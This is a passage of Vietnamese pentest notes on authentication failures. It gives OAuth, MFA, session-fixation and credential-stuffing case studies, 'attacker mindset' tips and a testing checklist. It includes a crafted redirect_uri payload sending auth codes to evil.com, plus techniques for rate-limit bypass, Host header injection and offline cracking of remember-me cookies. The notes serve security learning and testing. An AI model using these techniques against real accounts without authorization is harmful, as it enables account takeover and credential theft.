**Case 2 – OAuth token hijack via open redirect (Bug Bounty pattern)**

Một app dùng OAuth với redirect_uri whitelist là `https://app.com/callback`. App này có open redirect tại `/redirect?url=`. Attacker craft: `redirect_uri=https://app.com/redirect?url=https://evil.com`. Authorization server chấp nhận (legitimate domain). User authorize → code redirect về app.com/redirect → redirect tiếp đến evil.com với `?code=AUTH_CODE` trong URL. Attacker dùng code để lấy access token.

**Case 3 – Instagram MFA Bypass (2019)**

Instagram có endpoint để verify OTP qua web không có rate limit (mobile app có, web không có). Attacker brute-force 6-digit OTP trực tiếp qua web endpoint → bypass MFA trong ~30 phút nếu không có timeout. Fixed sau khi được report trên HackerOne.

**Case 4 – Session Fixation trên banking app (pattern phổ biến)**

App cũ không regenerate session ID sau login. Attacker tạo session (GET /login), lấy session ID, gửi link có `?sessionid=KNOWN_ID` cho victim. Victim login → session ID cũ được authenticated. Attacker dùng session ID đã biết → access account của victim. Root cause: thiếu `session.regenerate()` sau authenticate.

**Case 5 – Rockstar Games credential stuffing (2021)**

Hàng trăm nghìn GTA Online account bị takeover qua credential stuffing từ các breach database. Users dùng cùng email/password trên nhiều gaming platform. Rockstar không có MFA → automated attack thành công. Ảnh hưởng: mất item trong game, fraudulent purchase, account ban.

---

## 💡 Attacker Mindset

> **"Trước khi brute-force password, hãy enum username trước."**

Brute-force với wordlist 10,000 password × 10,000 username = 100M request. Nhưng nếu enum được username trước → 10,000 password × 1 target username = 10,000 request. Tiết kiệm 99.99% thời gian và traffic.

> **"Khi thấy MFA, đừng vội brute-force OTP — thử skip bước verify trước."**

Hầu hết MFA bypass trong pentest không phải crack OTP mà là logic flaw: app không enforce "đã verify MFA" trước khi cho vào trang chính. Force browse đến `/my-account` sau bước 1 luôn là bước thử đầu tiên.

> **"OAuth `state` param = CSRF token. Thiếu `state` = CSRF trong OAuth flow."**

Mỗi lần thấy OAuth, kiểm tra ngay: có `state` param không? Nếu không → CSRF attack khả thi, cho phép attacker force-link OAuth account của victim với account của attacker.

> **"Password reset là một authentication mechanism khác — cần test kỹ như login form."**

Reset flow thường ít được test hơn login form nhưng có attack surface riêng: Host header injection, token predictability, token không expire, token không validate ownership.

> **"Remember me cookie trông như hash → luôn decode trước khi kết luận."**

Pattern phổ biến: `base64(username:md5(password))`. MD5 crack trong giây với GPU. Một cookie tưởng "an toàn" có thể là goldmine để crack offline credential.

---

## ✅ Quick Pentest Checklist

**Username Enumeration**
- [ ] Gửi request với valid username vs invalid username → response khác nhau?
- [ ] Check status code, error message, response length, response time
- [ ] Test trên: login form, registration form, password reset form, forgot username

**Brute-force**
- [ ] Test rate limiting: 50 requests liên tục → bị block không?
- [ ] Test X-Forwarded-For bypass nếu có IP-based rate limit
- [ ] Test lockout reset bằng cách xen kẽ correct login
- [ ] Thử password spray (1 common password × nhiều username)

**MFA Bypass**
- [ ] Force browse đến authenticated page sau login step 1 (bỏ qua MFA)
- [ ] Test flawed logic: đổi username/account field trong MFA step
- [ ] Check rate limit trên OTP endpoint (web vs mobile app endpoint khác nhau)

**Remember Me / Session**
- [ ] Decode remember-me cookie (base64, hex) → phân tích structure
- [ ] Logout → dùng lại session ID cũ → còn valid không?
- [ ] Session ID có thay đổi sau login không?
- [ ] Session ID có trong URL không?

**Password Reset**
- [ ] Test Host header injection trong forgot-password form
- [ ] Test X-Forwarded-Host bypass nếu Host bị validate
- [ ] Analyze reset token: length, charset, predictability
- [ ] Test token expiration: 1h sau còn dùng được không?
- [ ] Test token reuse: sau reset, dùng lại token → bị reject không?
- [ ] Test ownership: lấy token của account A, đổi username sang account B trong form

**OAuth**
- [ ] Identify state param → test CSRF nếu thiếu
- [ ] Test redirect_uri manipulation (path, subdomain, open redirect)
- [ ] Check /.well-known/oauth-authorization-server endpoint
- [ ] Test implicit flow: modify email/user_id trong POST body
- [ ] Test scope escalation

---

*Nguồn: [OWASP Top 10:2025 – A07](https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/) · [PortSwigger – Authentication](https://portswigger.net/web-security/authentication) · [PortSwigger – OAuth 2.0](https://portswigger.net/web-security/oauth) · [NIST SP 800-63b](https://pages.nist.gov/800-63-3/sp800-63b.html)*
